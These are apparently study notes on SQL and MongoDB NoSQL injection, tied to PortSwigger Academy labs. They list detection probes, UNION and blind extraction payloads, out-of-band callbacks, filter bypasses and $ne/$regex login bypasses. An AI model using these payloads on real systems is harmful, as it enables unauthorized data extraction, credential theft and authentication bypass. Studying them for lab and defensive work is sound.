# Ch11: SQL Injection & NoSQL Injection

Sources: `/web-security/sql-injection`, `/web-security/nosql-injection`. SQLi overlaps `bug-bounty-bootcamp`/`owasp-wstg`/`payloads-all-the-things`; NoSQLi is the modern sibling most books lack. Academy framing: *probe for conditional behavior first, then pick the extraction technique the context allows.*

## SQLi — detection signals

- Single `'` → SQL error/500/different response = candidate. Then `'--` fixes it / `' or '1'='1` vs `' or '1'='2` divergence confirms.
- Boolean probes: `AND 1=1` vs `AND 1=2` (or `OR` variants) → different content.
- Error-based: `'`/`CAST`/type-mismatch payloads returning DB error text — the error message itself leaks data (`CAST((SELECT password FROM users LIMIT 1) AS int)`).
- Time-based: `'; SELECT pg_sleep(5)--` / `WAITFOR DELAY` / `SLEEP(5)` / `BENCHMARK` — delta vs baseline. Required when nothing reflects.
- OOB: `xp_dirtree`/`LOAD_FILE`/`UTL_HTTP`/`COPY ... TO PROGRAM`-style DNS/HTTP callbacks to your listener — the last resort channel.
- Injection points beyond params: `ORDER BY` clauses, column names, `LIMIT`/`OFFSET`, `Cookie`/`Referer`/`User-Agent` headers, second-order (payload stored safely, executed in a later query), JSON/XML fields, UPDATE vs SELECT asymmetry.

## SQLi — exploitation patterns

- **Subverting logic**: `admin'--` on login (comment out the password check).
- **Retrieving hidden data**: `' OR 1=1--` against `WHERE released = 1` filters → unreleased rows.
- **UNION attacks**: find column count via `ORDER BY n` increment or `UNION SELECT NULL,NULL,...` until no error; find string-accepting columns (`'a'` in each position); then `UNION SELECT username,password FROM users--`. Oracle needs `FROM dual`; use `NULL` for type-mismatched columns.
- **Examining the database**: `SELECT banner FROM v$version`/`@@version`/`sqlite_version()`/`version()`; schema via `information_schema.tables`/`information_schema.columns` (or Oracle `all_tables`/`all_tab_columns`, sqlite `sqlite_master`). Fingerprint first — syntax differs.
- **Blind extraction**: conditional (`SUBSTRING(password,1,1)='a'` → true/false response delta), error-triggered (`CASE WHEN ... THEN 1/0`), time-delayed (`CASE WHEN ... THEN pg_sleep(5)`), OOB (`'||UTL_INADDR.get_host_address(...)`).
- **Different query contexts**: UPDATE/INSERT/DELETE statements (second-order surfaces), `SELECT INTO`, stacked queries where the driver allows them.
- **Bypasses**: encoding (URL/double-URL/hex/unicode), comments-as-whitespace (`/**/`), case mixing, inline keyword splitting, DB-specific quirks — escalate to `payloads-all-the-things` when a WAF/filter appears.

## NoSQL injection (MongoDB-centric)

Two flavors:

- **Syntax injection** — break out of the query string like SQLi: `'` probes, `"` variants, Mongo's `$where`-adjacent JS. Determine which characters are processed: fuzz chars, observe errors/deltas.
- **Operator injection** — inject Mongo operators via JSON or `param[$ne]=x` query syntax:
  - `{"$ne":""}` on password/login fields → matches any non-empty value → auth bypass (`user[$ne]=x&pass[$ne]=x`).
  - `{"$regex":"^a"}`/`{"$where":"..."}` → boolean extraction oracle: iterate chars of field values (`{"username":"admin","password":{"$regex":"^p"}}` → login success/failure per char).
  - `{"$gt":""}` type-confusion bypasses.
- **Confirming conditional behavior**: inject `&&true`/`&&false` or `$ne` equivalents → response difference = injectable.
- **Extracting field names**: `$where`-style JS that iterates `Object.keys(this)` → boolean-discover field names before extracting values.
- **Timing-based**: JS in `$where` with sleep — `this.password[0]=='a' && sleep(5000)`.
- **Detection tip**: JSON APIs take `{"$ne":...}` directly; form-encoded endpoints take `user[$ne]=x` — test both transports.

## Lab reference

`https://portswigger.net/web-security/all-labs#sql-injection` (~15 labs: error/UNION/blind/OOB/second-order per DBMS) · `#nosql-injection`
